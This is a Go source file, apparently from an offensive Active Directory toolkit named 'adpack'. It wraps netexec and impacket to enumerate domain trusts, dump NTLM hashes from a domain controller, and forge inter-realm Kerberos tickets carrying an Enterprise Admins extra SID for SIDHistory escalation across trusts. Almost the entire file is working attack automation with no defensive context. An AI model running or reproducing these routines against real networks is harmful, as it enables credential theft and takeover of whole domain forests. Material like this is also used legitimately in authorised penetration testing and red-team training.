package modules

import (
	"adpack/utils"
	"fmt"
	"strings"
)

type TrustManager struct{}

func (t *TrustManager) List(dcIP, user, pass, domain string) error {
	if dcIP == "" || user == "" || pass == "" || domain == "" {
		return fmt.Errorf("dc-ip, user, password, and domain are required")
	}
	utils.Step("Enumerating domain trusts...")
	result := utils.RunCommand("nxc", "ldap", dcIP, "-u", user, "-p", pass, "-d", domain, "--trusted-domains")
	if !result.Success {
		return fmt.Errorf("trust enumeration failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (t *TrustManager) Keys(dcIP, user, pass, domain string) error {
	utils.Step("Extracting trust keys...")
	result := utils.RunCommand("impacket-secretsdump", fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, dcIP), "-just-dc-ntlm")
	if !result.Success {
		return fmt.Errorf("secretsdump failed: %s", result.Stderr)
	}
	for _, line := range strings.Split(result.Stdout, "\n") {
		if strings.Contains(line, "$") && !strings.Contains(line, "krbtgt") {
			fmt.Println(line)
		}
	}
	return nil
}

func (t *TrustManager) InterRealm(targetDomain, dcIP, user, pass, domain, trustKey string) error {
	if trustKey == "" || domain == "" || targetDomain == "" {
		return fmt.Errorf("trust-key, domain, and target-domain are required")
	}
	utils.Step(fmt.Sprintf("Forging inter-realm TGT for %s...", targetDomain))
	domainSID, err := retrieveDomainSID(dcIP, user, pass, domain)
	if err != nil {
		return fmt.Errorf("retrieve domain SID: %w", err)
	}
	result := utils.RunCommand("impacket-ticketer",
		"-nthash", trustKey,
		"-domain-sid", domainSID,
		"-domain", domain,
		"-extra-sid", domainSID+"-519",
		"-spn", fmt.Sprintf("krbtgt/%s", targetDomain),
		"Administrator")
	if !result.Success {
		return fmt.Errorf("ticketer failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (t *TrustManager) SIDHistory(targetDomain, dcIP, user, pass, domain, nthash string) error {
	if domain == "" {
		return fmt.Errorf("domain is required")
	}
	if nthash == "" {
		return fmt.Errorf("nthash is required for SIDHistory — use trust keys to extract")
	}
	utils.Step(fmt.Sprintf("SIDHistory injection for %s...", targetDomain))
	domainSID, err := retrieveDomainSID(dcIP, user, pass, domain)
	if err != nil {
		return fmt.Errorf("retrieve domain SID: %w", err)
	}
	result := utils.RunCommand("impacket-ticketer",
		"-nthash", nthash,
		"-domain-sid", domainSID,
		"-domain", domain,
		"-extra-sid", domainSID+"-519",
		"Administrator")
	if !result.Success {
		return fmt.Errorf("ticketer failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func retrieveDomainSID(dcIP, user, pass, domain string) (string, error) {
	result := utils.RunCommand("nxc", "ldap", dcIP, "-u", user, "-p", pass, "-d", domain, "--get-sid")
	if !result.Success {
		return "", fmt.Errorf("get domain SID: %s", result.Stderr)
	}
	for _, line := range strings.Split(result.Stdout, "\n") {
		if strings.Contains(line, "S-1-5-21-") {
			parts := strings.Fields(line)
			for _, p := range parts {
				if strings.HasPrefix(p, "S-1-5-21-") {
					return strings.TrimSpace(p), nil
				}
			}
		}
	}
	return "", fmt.Errorf("could not parse domain SID from output")
}
